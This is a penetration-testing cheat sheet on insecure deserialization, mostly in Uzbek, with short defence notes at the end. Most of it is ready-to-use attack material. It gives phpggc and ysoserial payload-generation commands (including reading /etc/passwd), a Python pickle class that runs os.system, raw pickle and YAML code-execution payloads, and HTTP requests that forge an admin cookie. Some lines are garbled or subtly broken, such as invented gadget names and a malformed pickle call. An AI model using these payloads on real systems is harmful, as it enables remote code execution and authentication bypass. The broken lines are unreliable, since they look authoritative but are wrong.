# Insecure Deserialization

## 1. Ta'rif
Insecure deserialization — server ishonmaydigan serialized obyektni qayta yuklaydi. Agar gadget/magical methods mavjud bo'lsa → RCE, SQLi (through objects), auth bypass. Barcha CVE'larning ajoyibi (ysoserial, phpggc).

## 2. Qayerdan kelib chiqadi
- PHP `unserialize()`, `__wakeup()`, `__destruct()`, `__toString()`
- Java `ObjectInputStream.readObject()`, ysoserial gadget chaining
- Python `pickle.load()`, `yaml.load()`
- .NET `BinaryFormatter`, JavaScript `aesDecrypt`/`reviver`
- Cookie/session'da serialized (base64) — format sign bo'lmasa
- User input JSON/YAML→to object, no allowlist

## 3. Turlari
| Tur | Example |
|-----|---------|
| PHP objects | unserialize cookie |
| Java Gadget | ysoserial CommonsCollections |
| Python Pickle | pickle.load() RCE |
| .NET BinaryFormatter | RCE |
| YAML | `yaml.load` → Python obj RCE |
| JWT-like | base64 objects (Laravel cookie) |

## 4. Metodologiya
1. Serialized data topish: base64 string, JSON'da `{"user":"O:8:..."}` — PHP O: syntax.
   - `auth=eyJ1c2VyIjoiTzo4OiJ1c2VyIjo2Ont9...` (base64 decode → PHP object)
2. Format aniqlang (base64/unserialized JSON) → php unserialize.
3. PHP: object property inject — magic method qaysi
   - `O:4:"User":1:{s:8:"username";s:5:"admin";}` (decode others)
   - Gadget chain: `phpggc -l` → `phpggc Laravel/RCE1 system 'id'` → payload base64
4. Java: kutiladigan tur topin — ysoserial:
   - `java -jar ysoserial.jar CommonsCollections1 'id' | base64`
5. Python pickle:
   ```python
   import pickle, os
   class R: __reduce__ = (lambda s: (os.system, ('id',)))
   pickle.dumps(R().__reduce__ if False else R())
   ```
6. YAML:
   ```yaml
   !!python/object/apply:os.system ["id"]
   ```
7. Auth bypass: `role`/`isAdmin` o'zgartirish (serialized object'da).

## 5. Payload'lar
```php
# PHP object injection
O:4:"User":1:{s:8:"username";s:5:"admin";s:3:"id";i:1;}
# magic __wakeup yoki gadget chain (phpggc):
phpggc Laravel/RCE1 system "id"
phpggc PHPG/PCR1 system "id"
# Har kuni O:+
O:+1:"User":1:{...}   # (PHP 5.6+)

# Java (ysoserial):
java -jar ysoserial.jar CommonsCollections2 "id" | base64
java -jar ysoserial.jar CommonsBeanutils1 "cat /etc/passwd"    # Versionsiz

# Python pickle:
cos
system
(S'id'
tR.

# yaml.load RCE
!!python/object/apply:subprocess.Popen ["id"]
```
## 6. Request misollari
```
GET / HTTP/1.1
Cookie: auth=O:4:"User":1:{s:8:"isAdmin";b:1;}

POST /api/profile HTTP/1.1
Content-Type: application/json

{"data": "O:4:\"User\":1:{s:8:\"username\";s:5:\"admin\";}"}
```
## 7. Zaif code misollari
```php
// ZAIF
$data = $_COOKIE['auth'];
$user = unserialize(base64_decode($data));

// Java — ZAIF
ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
Object o = ois.readObject();
```
## 8. Nimalarga ahamiyat berish (checklist)
- [ ] Cookie'dan base64 serialize bo'lsa — decode + object structure
- [ ] PHP `O:` format — debuglash / magic method
- [ ] `__destruct`/`__wakeup`/`__toString` — chain uchun ochiq inventar
- [ ] Gadget chainlar framework'ga bog'liq (Laravel/Symfony/Java libs)
- [ ] Java — ysoserial alla-qordontcion
- [ ] Pickle/yaml — python backend
- [ ] Signatur bo'lmasa — payload o'zgartirish mumkin
- [ ] .NET `MarkerEvent` / `BinaryFormatter` CE
- [ ] Deserialization filter / bat bonus
## 9. Himoya
- Never deserialize user-controlled data; JSON/XML with strict schema
- HMAC sign + integrity, signed payloads (verify)
- Java Serialization Filter, .NET allowed types, PHP `allowed_classes=false`
- Replace with safe formats